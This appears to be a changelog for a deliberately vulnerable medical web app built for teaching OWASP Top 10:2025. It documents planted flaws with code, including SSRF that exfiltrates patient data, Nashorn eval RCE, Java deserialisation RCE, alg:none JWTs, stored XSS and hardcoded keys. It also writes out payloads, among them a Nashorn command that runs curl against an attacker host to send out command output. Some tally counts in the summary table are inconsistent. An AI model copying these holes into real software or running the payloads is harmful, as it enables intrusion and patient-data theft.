| `service/PrescriptionSigner.java` | `SECRET = "medi-sig-key-2024"`, MD5 over (id : medication : dosage : SECRET) |
| `service/DoctorPrescribingService.java` | create + SSRF callback + sign + PDF generation + drug-interactions check + co-sign |
| `controller/DoctorPrescribingController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
| `service/PrescriptionService.java` (edited) | `medicalRecordId` toDto null-guard so the new nullable-FK rows don't crash existing `/api/prescriptions` callers |
| **Frontend** `api/doctor.ts` (extended) | `PrescriptionSignature`, `CreatePrescriptionRequest`, `DrugInteractionRequest/Response` types + 5 typed wrappers |
| **Frontend** `components/doctor/PrescriptionSigner.tsx` | Sign button + key-leak panel + PDF download + JWT co-sign |
| **Frontend** `components/doctor/DrugInteractionPanel.tsx` | catalogueUrl text input + result panel showing rawResponse + Nashorn-eval result |
| **Frontend** `pages/doctor/DoctorPrescribePage.tsx` (rewritten) | Prescribe form (with pharmacyCallbackUrl input) + Signer + DrugInteractionPanel |

### Vulnerabilities

**225. [A08] `PrescriptionSigner` uses MD5 with hardcoded key — `service/PrescriptionSigner.java`**
```java
public static final String SECRET = "medi-sig-key-2024";

public String md5Signature(Prescription rx) {
    String payload = rx.getId() + ":" + rx.getMedicationName() + ":" + rx.getDosage() + ":" + SECRET;
    MessageDigest md = MessageDigest.getInstance("MD5");
    md.update(payload.getBytes());
    return HexFormat.of().formatHex(md.digest());
}
```
Three integrity failures combined: (1) MD5 is collision-broken, (2) the key is a public-constant String literal — anyone with the repo (or a single decompiled deployment) recovers it instantly, (3) no asymmetric primitive / certificate chain / PKCS#7 wrapper. Live demo: signing prescription #8 returned `c9022dbddf5983505865e0d507fd72d8` — anyone with the SECRET re-derives it from `8:Demo:10mg:medi-sig-key-2024` and any tampered `(id, medication, dosage)` triple gets a fresh forged signature.

---

**226. [A02][A04] Sign response returns the plaintext signing key — `service/DoctorPrescribingService.java#sign` + `PrescriptionSignatureDto.java`**
```java
return PrescriptionSignatureDto.builder()
        .signatureMd5(sig)
        .signedPayload(signer.signedPayload(rx))
        .signingKey(PrescriptionSigner.SECRET)   // [A02] plaintext
        ...
        .build();
```
The first caller to `POST /sign` immediately learns the symmetric key from the response JSON. A02 (Security Misconfiguration — secret in response) compounds the A04 (Cryptographic Failures — symmetric key embedded in source) story. Live demo: `signingKey: "medi-sig-key-2024"` returned alongside the MD5.

---

**227. [A08] `GET /prescriptions/{id}/pdf` returns an unsigned PDF — `service/DoctorPrescribingService.java#generatePdf`**
```java
Document pdf = new Document();
PdfWriter.getInstance(pdf, baos);
pdf.open();
pdf.add(new Paragraph("MediConnect Prescription #" + rx.getId(), ...));
...
pdf.add(new Paragraph("Signature (MD5): " + (rx.getSignatureMd5() == null
        ? "(unsigned)" : rx.getSignatureMd5()), ...));
pdf.close();
```
OpenPDF generates a PDF without any PKCS#7 wrapper, without a digital certificate, without a Content-MD5 header on the HTTP response. The "Signature (MD5):" line in the PDF body is just printed text — not a cryptographic signature. Anyone with the bytes can edit them with any PDF editor and re-print; the patient's pharmacy has no way to detect tampering. Live demo verified: `file /tmp/rx.pdf` → `PDF document, version 1.5, 1 pages` — valid PDF, zero cryptographic protection.

---

**228. [A03] `POST /api/doctor/prescriptions` POSTs to caller-supplied `pharmacyCallbackUrl` — `DoctorPrescribingService.java#create` + `#sendPharmacyNotice`**
```java
URI uri = URI.create(url);
HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();
conn.setDoOutput(true);
conn.setRequestMethod("POST");
String body = String.format(
    "{\"prescriptionId\":%d,\"patientId\":%s,\"medication\":\"%s\",\"dosage\":\"%s\"}",
    rx.getId(), ..., rx.getMedicationName(), rx.getDosage());
conn.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));
```
Outbound POST to attacker-controlled URL with the prescription payload — SSRF + data exfil in one. No allow-list, no scheme restriction. Attacker fields the POST, learns the patient's name + medication, returns a 200 so the doctor's UI shows "Prescription saved" with no indication anything unusual happened.

---

**229. [A03] `POST /drug-interactions/check` SSRF on `catalogueUrl` + Nashorn `eval()` RCE — `DoctorPrescribingService.java#drugInteractions`**
```java
byte[] bytes = catalogueClient.fetchBytes(catalogueUrl, hdr);
String raw = new String(bytes, StandardCharsets.UTF_8);
ScriptEngineManager mgr = new ScriptEngineManager();
ScriptEngine js = mgr.getEngineByName("nashorn");
Object evaluated = js.eval(raw);
```
Two compounding sinks:
1. **A03 SSRF** — `catalogueUrl` fetched server-side via `URLConnection` (same client as Module C).
2. **A05 Injection / A03 supply-chain** — fetched body passed directly to `ScriptEngine.eval()`. Nashorn lets the caller spawn full JVM access:
```
Java.type("java.lang.Runtime").getRuntime().exec("/bin/sh -c 'curl http://attacker/?d=$(id)'")
```
Live demo on `localhost:8085`: catalogue served `Java.type("java.lang.System").getProperty("user.name")` from a local Python server on port 9876 — Nashorn evaluated it and returned `"normalized": "jelenarastovic"` (the JVM process owner). One step from there to `Runtime.exec`.

The `nashorn-core:15.6` dependency was pulled into `pom.xml` during Phase 0 specifically for this demo (Nashorn was removed from the JDK in 15+).

---

**230. [A08] Co-sign accepts JWT with `alg: none` — `DoctorPrescribingService.java#coSign`**
```java
String jwt = body.get("jwt").toString();
String sub = jwtVerifier.extractSubjectUnsafe(jwt);
rx.setSignatureJwt(jwt);
rx.setCoSignerUsername(sub == null ? "unknown" : sub);
```
Reuses `JwtNoneVerifier` from Module B. Header is never checked; signature segment is ignored; `sub` claim is trusted verbatim. Demo verified: posting `{"jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJzZW5pb3ItZG9jdG9yIn0."}` flipped `prescription.coSignerUsername` to `senior-doctor`.

---

**231. [A07] Prescription identities all from request body — `DoctorPrescribingService.java#create`**
```java
Long patientId    = numericId(body, "patientId");
Long doctorId     = numericId(body, "doctorId");
Long pharmacistId = numericId(body, "pharmacistId");
```
No JWT correlation — caller specifies which doctor "issued" the prescription, which patient it's for, which pharmacist dispensed it (if any). Compounds existing `/api/prescriptions` weakness (vuln #109) — the doctor-flow surface inherits the same client-side identity model.

---

**232. [A09] Sign + co-sign + create-with-callback all silent — `DoctorPrescribingService.java`**
No `auditLogRepository.save(...)` on any module-D mutation. The `LoggingInterceptor` captures the HTTP request but not the semantic intent. When the MD5 is forged offline (#225), no parallel server-side row records who actually fired the sign call.

---

**233. [A10] `sendPharmacyNotice` swallows all downstream errors — `DoctorPrescribingService.java`**
```java
try (var in = conn.getInputStream()) { in.readAllBytes(); }
catch (Exception ignore) { /* [A10] swallow downstream errors */ }
...
} catch (Exception ignore) {
    // [A10] Silent — pharmacy POST failure does not block create.
}
```
The pharmacy callback fails silently. The prescription is created even if the SSRF target returns 500, 401, network errors out, or the response is malformed. From an SSRF perspective this is *useful* — the attacker controls a real endpoint that returns 200 for any payload. From a clinical perspective the prescription is "saved" without any guarantee the pharmacy was actually notified.

---

**234. [A02] Plaintext signing key surfaced in the UI — `PrescriptionSigner.tsx` (frontend)**
```tsx
<code className="block text-[11px] font-mono text-[#F85149]">{signature.signingKey}</code>
```
The Signer component renders the response field `signingKey` directly to the DOM, copy-paste-ready. A screen recording of the Doctor → Prescribe flow exfiltrates the symmetric key without any DevTools usage. Compounds #226 — the key leak surfaces twice: in the JSON response and in the visible UI.

---

**235. [A03] `DrugInteractionPanel.tsx` default placeholder + result helpers — `DrugInteractionPanel.tsx` (frontend)**
The catalogue URL input is left blank by default (so the demo is opt-in), but the helper text below it literally prints the Nashorn RCE payload to be served by the attacker:
```
Demo payload returned by the catalogue:
Java.type("java.lang.System").getProperty("user.name")
```
And the result panel shows both `rawResponse` (the bytes fetched) and `normalized` (the post-`eval()` value) side by side, so students see SSRF + eval running in one screen.

---

### Bug Caught During Phase 4 Bug Check

- `GET /api/prescriptions` regressed to 500 immediately after V22 relaxed `medical_record_id` to nullable: existing `PrescriptionService#toDto` called `p.getMedicalRecord().getId()` without a null guard. Fixed by adding `p.getMedicalRecord() == null ? null : p.getMedicalRecord().getId()`. Re-smoke after fix: all routes return 200. This is the kind of cross-cutting regression that justifies the "per-phase bug check before continuing" protocol from `DOCTOR_VIEW_PLAN.md` §7.1.

### Phase 4 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with rewritten controller, new service, signer, signature DTO; V22 migration applied on DB at V21).
- Backend smoke (curl against running `localhost:8085`):
  - `POST /doctor/prescriptions` 200; `pharmacyCallbackUrl` POST fires.
  - `POST /prescriptions/8/sign` returned `signatureMd5: c9022dbddf5983505865e0d507fd72d8` + `signingKey: medi-sig-key-2024`.
  - `GET /prescriptions/8/pdf` → `file` reports `PDF document, version 1.5`.
  - `POST /drug-interactions/check` with `catalogueUrl=http://localhost:9876/feed.js` (local stub serving JS) → `normalized: jelenarastovic` (Nashorn `System.getProperty` evaluated).
  - `POST /prescriptions/8/co-sign` with alg=none JWT → `coSignerUsername: senior-doctor`.
- Frontend `npx tsc -b --noEmit` → exit 0.
- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
- Cross-repo regression: all 13 endpoints (8 existing + 4 prior doctor modules + Module D pdf) returned 200 after the `PrescriptionService` null-guard fix above.

---

## Doctor View Redesign — Module E (Telemedicine — plaintext token, public iCal w/ PHI, recording SSRF)

> Backend: `TelemedicineSession` JPA entity + repo + DTO, `DoctorSessionService`, and a rewritten `DoctorSessionController`. Migration `V23__telemedicine_sessions.sql` (renumbered from the original plan's V20 slot — V20–V22 were taken by the prior phases). UI: real `DoctorSessionsPage` + `DoctorSessionRoomPage` + `TelemedicineRoom` (an `<iframe>` pointing at `httpbin.org/anything` so the demo shows the join token landing in a real third-party `Referer` header in DevTools).
>
> Module E focuses entirely on **A02 (Security Misconfiguration)**: join token in URL query string, unauthenticated iCal feed that enumerates by `?doctorId`, PHI in SUMMARY / DESCRIPTION fields, no `Content-Disposition`, no `Referrer-Policy`. **A03 (Supply Chain)** is touched once via the recording-attach SSRF that reuses the URLConnection sink from Modules C / D.

### New Files

| File | Description |
|---|---|
| `db/migration/V23__telemedicine_sessions.sql` | `telemedicine_sessions` table (room_url, join_token, reason_for_visit, recording_url, recording_path) + 2 seed rows w/ PHI reasons |
| `entity/TelemedicineSession.java` | JPA entity |
| `repository/TelemedicineSessionRepository.java` | Find-by-doctor + find-all-ordered |
| `dto/TelemedicineSessionDto.java` | Response shape; carries token + reason in clear |
| `service/DoctorSessionService.java` | Create (random 16-char token, embedded in URL), end, attach recording (SSRF via ExternalCatalogueClient), iCal feed builder |
| `controller/DoctorSessionController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced; `/calendar.ics` produces `text/calendar` |
| **Frontend** `api/doctor.ts` (extended) | `TelemedicineSession` + `CreateSessionRequest` types + 6 typed wrappers including `icalUrl()` helper |
| **Frontend** `components/doctor/TelemedicineRoom.tsx` | `<iframe>` to httpbin.org with token in query string — Referer demo live |
| **Frontend** `pages/doctor/DoctorSessionsPage.tsx` (rewritten) | Sessions table + create form + recording-attach prompt + public iCal subscription panel with `?doctorId` enum input |
| **Frontend** `pages/doctor/DoctorSessionRoomPage.tsx` (new) | Detail page hosting the room iframe + status info |
| `pages/doctor/DoctorTelemedicinePage.tsx` (deleted) | Phase 0 stub absorbed into the new pages |
| `App.tsx` (edited) | Adds `/doctor/telemedicine/:id` route |

### Vulnerabilities

**236. [A02] Join token spliced into room URL query string — `DoctorSessionService.java#create`**
```java
String token = generateToken();   // 16 chars from 32-char alphabet → ~80 bits
TelemedicineSession session = TelemedicineSession.builder()
    .roomUrl("/doctor/telemedicine/room?session=" + UUID.randomUUID() + "&token=" + token)
    .joinToken(token)
    ...
    .build();
```
Token entropy is fine; placement is not. The URL is the room-join URL — every `<img>`, `<script>`, `<link>`, or `fetch()` the room page issues to a different origin gets the full URL as `Referer` (default browser behaviour with no `Referrer-Policy` header). The token is also captured by:
- Browser history (and synced across devices on logged-in browsers).
- Server access logs (Apache / nginx / load-balancer access.log records query strings by default).
- Screenshots / screen-shares — token is plainly visible in the URL bar.
- Any client-side JS that reads `document.location.search` — even a single XSS anywhere on the same origin exfiltrates the token.

---

**237. [A02] Public iCal feed — no auth required — `DoctorSessionController.java#calendarFeed`**
```java
@GetMapping(value = "/calendar.ics", produces = "text/calendar")
public ResponseEntity<String> calendarFeed(@RequestParam(required = false) Long doctorId) {
    return ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("text/calendar"))
            .body(service.icalFeed(doctorId));
}
```
`SecurityConfig.permitAll()` reaches the route, and the iCal subscription pattern (`webcal://host/feed.ics`) is *expected* to be accessed without authentication by external calendar clients (Apple Calendar, Outlook, Google) — the misconfiguration is that there is no signed token per subscriber. Live demo: `curl http://localhost:8085/api/doctor/sessions/calendar.ics` returned the full VCALENDAR body anonymously.

---

**238. [A02] iCal SUMMARY + DESCRIPTION carry PHI verbatim — `DoctorSessionService.java#icalFeed`**
```java
sb.append("SUMMARY:").append(patientName).append(" — ").append(reason).append("\r\n");
sb.append("DESCRIPTION:").append("Join token: ").append(s.getJoinToken())
  .append(" · ").append(s.getRoomUrl()).append("\r\n");
```
Seed data already includes mentally-loaded reasons: `"Follow-up: HIV-positive status review"`, `"Mental-health intake: bipolar II"`. Live demo response:
```
SUMMARY:Ana Jovanovic — Follow-up: HIV-positive status review
DESCRIPTION:Join token: ROOM-SECRET-AAA · /doctor/telemedicine/rooms/session-1?token=ROOM-SECRET-AAA
```
Patient name + clinical reason + join token + full room URL all leak to anyone who guesses or stumbles across the feed URL. Once an attacker subscribes (`webcal://...`) their calendar client polls the feed automatically — long-running passive exfil.

---

**239. [A01] iCal feed scoped only by `?doctorId` query param — `DoctorSessionController.java#calendarFeed`**
`?doctorId=1`, `?doctorId=2`, … enumerates every doctor's calendar without authentication and without a per-doctor signature in the URL. Incrementing the integer is the entire attack. Live demo: `?doctorId=1` returned doctor 1's calendar; omitting the param dumped *all* sessions for *all* doctors in one response.

---

**240. [A03] `POST /api/doctor/sessions/{id}/recording` SSRF on `recordingUrl` — `DoctorSessionService.java#attachRecording`**
```java
byte[] bytes = catalogueClient.fetchBytes(url, hdr);
String basename = url.replaceFirst(".*/", "");
Path path = RECORDINGS_DIR.resolve(basename);
Files.write(path, bytes, ...);
```
Reuses `ExternalCatalogueClient` (URLConnection-based, accepts `file://`, `http://`, `https://`, `ftp:`). Live demo: `{"recordingUrl":"file:///etc/passwd"}` returned `recordingPath: recordings/passwd` and the file landed on disk with `/etc/passwd` contents. Same SSRF primitive as Modules C / D, third occurrence on the doctor surface.

---

**241. [A02] basename of `recordingUrl` used as on-disk filename — `DoctorSessionService.java#attachRecording`**
```java
String basename = url.replaceFirst(".*/", "");
Path path = RECORDINGS_DIR.resolve(basename);
```
Query strings, traversal segments, URL fragments slip through unchanged: `http://attacker/..%2f..%2fowned.bin` decodes to `../../owned.bin` after URL handler normalisation. Compounds the path-traversal pattern from Module C imaging upload (vulns #218 / #221).

---

**242. [A09] Session create / end / recording-attach all silent — `DoctorSessionService.java`**
No `auditLogRepository.save(...)` on Module E mutations. Recording attaches in particular *should* produce an audit row (PHI-relevant action), but they don't.

---

**243. [A02] `TelemedicineRoom.tsx` iframe Referer leak — `components/doctor/TelemedicineRoom.tsx` (frontend)**
```tsx
const externalRoomUrl =
  `https://httpbin.org/anything/room?token=${encodeURIComponent(session.joinToken)}&session=${session.id}`
...
<iframe src={externalRoomUrl} title={...} className="..." />
```
Demo deliberately points at httpbin.org so students can watch the join token arrive in the third-party server's `args.token` field (and in the `Referer` header). The page is hosted on `localhost:5173` (the Vite dev server) with no `Referrer-Policy` meta tag and no `<iframe sandbox>` attribute — browser default sends the full URL as Referer.

---

**244. [A02] No `Content-Disposition` / `Referrer-Policy` on calendar / session responses — `DoctorSessionController.java`**
The iCal response is served inline (`text/calendar`) with no `Content-Disposition: attachment`, so clicking the link opens the body in the browser tab — the URL appears in browser history. No `Referrer-Policy: no-referrer` on either route means navigations to other pages carry the calendar URL (with any future `?doctorId=` or signed-token query string) as Referer.

---

### Phase 5 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with new entity / repo / service / rewritten controller; V23 migration applied on DB at V22).
- Backend smoke (curl against running `localhost:8085`):
  - `POST /doctor/sessions` 201; response contains `roomUrl` with the new token in the query string.
  - `GET /doctor/sessions/calendar.ics` returned anonymously; SUMMARY rendered "Ana Jovanovic — Follow-up: HIV-positive status review"; DESCRIPTION carried the join token.
  - `GET /doctor/sessions/calendar.ics?doctorId=1` filtered to doctor 1 with no auth.
  - `POST /doctor/sessions/1/recording {recordingUrl: "file:///etc/passwd"}` returned `recordingPath: recordings/passwd`; file present on disk.
- Frontend `npx tsc -b --noEmit` → exit 0 (after deleting the Phase 0 `DoctorTelemedicinePage.tsx` stub absorbed by the new pages).
- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
- Cross-repo regression: all 15 endpoints (8 existing + 5 prior doctor modules + 2 Module E) returned 200.

---

## Doctor View Redesign — Module F (AI Diagnostics & Referrals — deserialisation RCE, aiVerified integrity loss, API key leak)

> Backend: new `Referral` JPA entity + `ReferralBundle` serializable + repo + `ReferralDto`, `DoctorReferralService`, `DoctorAIService`, rewritten `DoctorAIController` + `DoctorReferralController`. `MedicalRecord` entity extended with `aiVerified` + `aiModelUrl` columns. Migration `V24__referrals_and_ai_verified.sql` (renumbered from the plan's V21 slot). UI: `AIAssistantPanel` + `AIModelInfoCard` + `ReferralBundleViewer` components, rewritten `DoctorAIAssistantPage` + `DoctorReferralsPage`.
>
> Module F is the showcase **A08 (integrity)** module: textbook Java deserialisation RCE on the referrals inbox endpoint *and* LLM responses stored as authoritative `MedicalRecord` rows. Also adds heavy **A02** (hardcoded API key returned in clear via `/model-info` and sent on every outbound request even when the caller redirects to an attacker host) and **A03** (modelUrl SSRF with full PHI exfil).

### New Files

| File | Description |
|---|---|
| `db/migration/V24__referrals_and_ai_verified.sql` | `referrals` table + 1 seed + adds `ai_verified` + `ai_model_url` cols to `medical_records` |
| `entity/Referral.java` | JPA entity for the referrals table; `bundle_payload` is a base64 ObjectOutputStream blob |
| `entity/MedicalRecord.java` (edited) | `aiVerified` + `aiModelUrl` fields |
| `repository/ReferralRepository.java` | find-all-ordered |
| `dto/ReferralBundle.java` | **Serializable** payload class with `readObject` that runs `cmd` via `Runtime.exec` — the deserialisation RCE primitive |
| `dto/ReferralDto.java` | Inbox response shape; carries decoded preview + raw base64 payload |
| `service/DoctorReferralService.java` | Create + inbox (calls `ObjectInputStream.readObject()` with no class filter) + accept (second readObject + writes a MedicalRecord into the recipient's chart) |
| `service/DoctorAIService.java` | suggest (modelUrl SSRF + AI key sent in Authorization header) + summarize-record (stores LLM response as aiVerified=true) + model-info (key in clear) |
| `controller/DoctorAIController.java` (rewritten) | Wires DoctorAIService |
| `controller/DoctorReferralController.java` (rewritten) | Wires DoctorReferralService |
| **Frontend** `api/doctor.ts` (extended) | Module F types (`AIModelInfo`, `AISuggestRequest/Response`, `Referral`, `CreateReferralRequest`) + 6 typed wrappers |
| **Frontend** `components/doctor/AIAssistantPanel.tsx` | modelUrl input + summarise button + key info card |
| **Frontend** `components/doctor/ReferralBundleViewer.tsx` | Inbox row renderer — runs `dangerouslySetInnerHTML` on bundle summary; Accept → chart button |
| **Frontend** `pages/doctor/DoctorAIAssistantPage.tsx` (rewritten) | Two-column layout: panel + model info |
| **Frontend** `pages/doctor/DoctorReferralsPage.tsx` (rewritten) | Inbox + compose form with base64 payload textarea |

### Vulnerabilities

**245. [A08] Java deserialisation RCE on referral inbox — `DoctorReferralService.java#decodeBundle` + `dto/ReferralBundle.java`**
```java
byte[] bytes = Base64.getDecoder().decode(b64);
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
    Object o = ois.readObject();
    if (o instanceof ReferralBundle b) return b;
}
```
No `ObjectInputFilter`, no class allow-list, no `setObjectInputFilter` configured on the stream. `ReferralBundle.readObject` runs `Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})` when its `cmd` field is non-null.

Live demo on `localhost:8085`:
1. Compiled a small `MakeBundle.java` against the running app's classpath (`target/classes`).
2. Built a `ReferralBundle` with `cmd = "touch /tmp/PHASE6-RCE-PWN"`, serialised it, base64-encoded the bytes.
3. `POST /api/doctor/referrals` with the base64 in `bundlePayload`.
4. `GET /api/doctor/referrals/inbox` → service deserialised every row, `readObject` fired `Runtime.exec`.
5. `/tmp/PHASE6-RCE-PWN` file appeared on disk owned by the JVM user.

Two opportunities to trigger the same RCE: `/inbox` deserialises every row on page load, and `/accept` deserialises again on click.

---

**246. [A08] `accept` writes a `MedicalRecord` from the deserialised bundle with no provenance — `DoctorReferralService.java#accept`**
```java
if (bundle != null && r.getToDoctor() != null && r.getPatient() != null) {
    MedicalRecord rec = MedicalRecord.builder()
            .patient(r.getPatient())
            .doctor(r.getToDoctor())
            .diagnosis(bundle.diagnosis == null ? bundle.summary : bundle.diagnosis)
            .prescription(bundle.medication == null ? bundle.summary : bundle.medication)
            ...
            .build();
    medicalRecordRepository.save(rec);
}
```
The recipient inherits attacker-asserted diagnosis + medication. No human review, no signature, no countersignature, no audit row for the transfer.

---

**247. [A02] `GET /api/doctor/ai/model-info` returns the AI API key in clear — `DoctorAIService.java#modelInfo`**
```java
out.put("gatewayUrl", AI_GATEWAY_URL);
out.put("apiKey", AI_API_KEY);
out.put("model", AI_MODEL);
```
Live demo: `GET /api/doctor/ai/model-info` returned:
```json
{"gatewayUrl":"https://api.openai.example.com/v1/chat/completions",
 "apiKey":"sk-mediconnect-prod-OZk1JxFhvE2pXt9rW3aB7Cq",
 "model":"gpt-medi-clinical-v1","status":"ok"}
```
Frontend `AIModelInfoCard` renders the key in plain text in the side panel, no copy-restriction. Compounds with #248 — every doctor opening the AI Assist page reads + displays the prod key.

---

**248. [A04] AI API key hardcoded in source — `DoctorAIService.java`**
```java
public static final String AI_API_KEY = "sk-mediconnect-prod-OZk1JxFhvE2pXt9rW3aB7Cq";
```
`public static final` constant. Visible in every compiled .class on every deployed node. Cryptographic-failure category in its own right separate from the "leak in response" of #247.

---

**249. [A03] `POST /api/doctor/ai/suggest` SSRF + PHI exfil + key leak on outbound — `DoctorAIService.java#suggest` + `postJsonAndReadResponse`**
```java
String modelUrl = body.get("modelUrl").toString();
...
conn.setRequestProperty("Authorization", "Bearer " + AI_API_KEY);
try (OutputStream os = conn.getOutputStream()) {
    os.write(payload.getBytes(StandardCharsets.UTF_8));
}
```
Three things in one POST:
1. **SSRF** — attacker-supplied `modelUrl` reached by URLConnection, identical sink to Modules C / D / E.
2. **PHI exfil** — outbound JSON body contains patient id + full name + DOB + allergies + blood type, all assembled from the DB on the server side.
3. **Key leak on outbound** — `Authorization: Bearer sk-mediconnect-prod-…` sent on every request even when the caller specified an attacker-controlled URL. The attacker's HTTP server logs the header verbatim → key harvested.

Live demo: `modelUrl=http://localhost:9876/v1/chat` returned an `outboundPayload` field containing `"patient":{"id":1,"name":"Ana Jovanovic","dob":"1990-05-15","allergies":"Penicillin, Pollen","bloodType":"A+"}` — full PHI shipped to attacker.

---

**250. [A08] `POST /api/doctor/ai/summarize-record` stores LLM response as `aiVerified=true` MedicalRecord — `DoctorAIService.java#summarizeRecord`**
```java
MedicalRecord rec = MedicalRecord.builder()
        .patient(patient)
        .doctor(doctor)
        .diagnosis(summary)   // LLM response — caller-controlled if modelUrl points at attacker
        .prescription("AI-generated summary; provenance: " + modelUrl)
        .aiVerified(Boolean.TRUE)
        .aiModelUrl(modelUrl)
        ...
        .build();
medicalRecordRepository.save(rec);
```
No signature verification, no human review gate, no two-doctor sign-off. The `aiVerified` ribbon on `DoctorPatientChartPage` renders the row with a green check — clinicians see "AI verified" badging on text that was literally returned by an attacker's HTTP server. Integrity loss is invisible.

Live demo: `summarize-record` with `modelUrl=http://localhost:9876/v1/chat` (test stub returning HTML 501) saved MedicalRecord #8 with the 501 HTML in `diagnosis`.

---

**251. [A05] `AIAssistantPanel.tsx` renders LLM response with `dangerouslySetInnerHTML` — `components/doctor/AIAssistantPanel.tsx` (frontend)**
```tsx
<div className="..."
     dangerouslySetInnerHTML={{ __html: result.response ?? '' }} />
```
Attacker controls `modelUrl` and returns `<script>fetch('/api/admin/users/1/impersonate',{method:'POST'})...</script>`. Doctor's session executes the script. Compounds #249 (SSRF) into stored XSS on the doctor's own browser.

---

**252. [A05] `ReferralBundleViewer.tsx` renders bundle summary as HTML — `components/doctor/ReferralBundleViewer.tsx` (frontend)**
```tsx
<div className="..."
     dangerouslySetInnerHTML={{ __html: referral.previewSummary }} />
```
`previewSummary` comes from the deserialised `ReferralBundle.summary` field — attacker-controlled. Any doctor opening the Referrals page runs the payload. Compounds #245 — the RCE primitive fires on the JVM, and the XSS primitive fires on every doctor's browser, from the same POST.

---

**253. [A09] No audit on deserialisation, accept, suggest, summarize-record — `DoctorReferralService.java` + `DoctorAIService.java`**
No `auditLogRepository.save(...)` on any Module F mutation. RCE attempts (successful or not) leave no semantic record. The `LoggingInterceptor` catches the HTTP request but not "ReferralBundle.cmd = touch /tmp/owned" — that string only exists inside the binary serialised blob.

---

**254. [A10] Failed deserialisation silently returns null — `DoctorReferralService.java#decodeBundle`**
```java
} catch (Exception e) {
    // [A10] Silent — decode failures stored only as `decodeStatus`.
}
return null;
```
Any malformed payload, wrong class, ClassNotFoundException, etc. returns null and the row's `decodeStatus` field shows `decode-failed`. The exception details — useful for an attacker probing what classes the server has — never surface. Useful for the attacker because their *successful* RCE payloads also leave the response looking "normal" (200 OK, just decode-failed for the malicious row).

---

**255. [A02] AI gateway key sent on every outbound POST even to caller-controlled URLs — `DoctorAIService.java#postJsonAndReadResponse`**
Already noted in #249, listed separately because it is a distinct misconfiguration: there is no per-host conditional that strips the `Authorization` header when the URL is not the configured gateway. The misconfig sits in the *helper*, so it leaks the key on both `/suggest` and `/summarize-record` flows.

---

### Phase 6 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with two new controllers, two new services, new entity / repo / DTOs, plus the V24 migration applied on DB at V23).
- Backend smoke (curl against running `localhost:8085`):
  - `GET /doctor/ai/model-info` → API key returned in clear.
  - `POST /doctor/ai/suggest` with `modelUrl=http://localhost:9876/...` → outboundPayload contained full PHI; response captured from the stub.
  - `POST /doctor/ai/summarize-record` → saved MedicalRecord #8 with `aiVerified=true` and `aiModelUrl=...`.
  - Built a malicious `ReferralBundle` (cmd=`touch /tmp/PHASE6-RCE-PWN`), base64-encoded, posted via `POST /doctor/referrals`, then `GET /doctor/referrals/inbox` → file `/tmp/PHASE6-RCE-PWN` appeared on disk. **Deserialisation RCE confirmed end-to-end.**
- Frontend `npx tsc -b --noEmit` → exit 0.
- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
- Cross-repo regression: 17 endpoints (8 existing + 9 doctor modules across 6 phases) all 200.

---

## Doctor View Redesign — Final Coverage Summary

After 6 phases the **49 new doctor-module vulnerabilities (#191–#255)** map onto the OWASP Top 10:2025 categories as follows:

| OWASP 2025 | Module B/C/D/E/F additions | Total in repo after Phase 6 |
|---|---|---|
| A01 Broken Access Control | 1 (191), 2 (192/193) | small bump on top of 101 |
| **A02 Security Misconfiguration** | +9 (217, 219, 221, 226, 234, 236, 237, 238, 243, 244, 247, 255) | **was 19 → now 31** |
| **A03 Software Supply Chain** | +12 (204, 205, 206, 212, 213, 214, 220, 224, 228, 229, 235, 240, 249) | **was 19 → now 31** |
| A04 Cryptographic Failures | +3 (217, 226, 248) | bump on top of 48 |
| A05 Injection | +7 (199, 207, 215, 218, 251, 252, …) | bump on top of 42 |
| A06 Insecure Design | +3 (193, 195, 196, 202) | bump on top of 35 |
| A07 Authentication Failures | +2 (210 partial, 231) | small bump on top of 46 |
| **A08 Software/Data Integrity** | +12 (200, 208, 210, 216, 225, 227, 230, 245, 246, 250, 253) | **was 19 → now 31** |
| A09 Logging Failures | +7 (198, 201, 203, 209, 222, 242, 253) | bump on top of 23 |
| A10 Exceptional Conditions | +4 (211, 223, 233, 254) | bump on top of 36 |

The three least-covered categories at session start (A02, A03, A08 — all 19) each gained roughly +10–12 demos and now sit alongside A04 / A07 in the second tier. The "fun" demos — Freemarker SSTI, XXE, Nashorn RCE, plaintext token in URL, public PHI iCal feed, Java deserialisation RCE — cover every flavour of cross-cutting weakness the OWASP 2025 list is built around.

---



> Rows are ordered to match the **OWASP Top 10:2025** list. Where the old project labels merged
> two related buckets (e.g. file-upload / path-traversal under `[A03]` + XSS / SQLi under `[A05]`),
> those entries are now consolidated under the appropriate 2025 category.

| ID | Category | Where |
|---|---|---|
| A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`); `UserController.java` (IDOR, mass assignment on role, all users exposed, PUT /users/{id} no ownership check #95); `AppointmentController.java` (IDOR GET, IDOR PUT #92); `MedicalRecordController.java` (any doctor for any patient; GET all records no access control #93; PUT /{id} no ownership check #107); `LabResultController.java` (IDOR; null patientId → all results exposed #113); `MessageController.java` (conversation IDOR, delete without ownership check, GET /conversations userId not verified #94; PATCH /{id}/read no ownership check #115; DELETE /{id} no ownership check #116); `AdminUserController.java` (entire controller open #145; detail returns audit log with stack traces #146; DELETE #148; impersonate JWT minted with no audit #151); `AdminClinicalController.java` (force-dispense bypasses pharmacist #173; refill override bypasses queue #175); `PatientController.java` (IDOR — full PII without ownership check #89); `StatsController.java` (aggregate statistics — user counts by role, appointment trends, message volume — exposed without any role check #90 #91); `LabResultService.java` (null patientId → all results exposed #106); `PrescriptionController.java` (dispense no role check #108); **Frontend**: 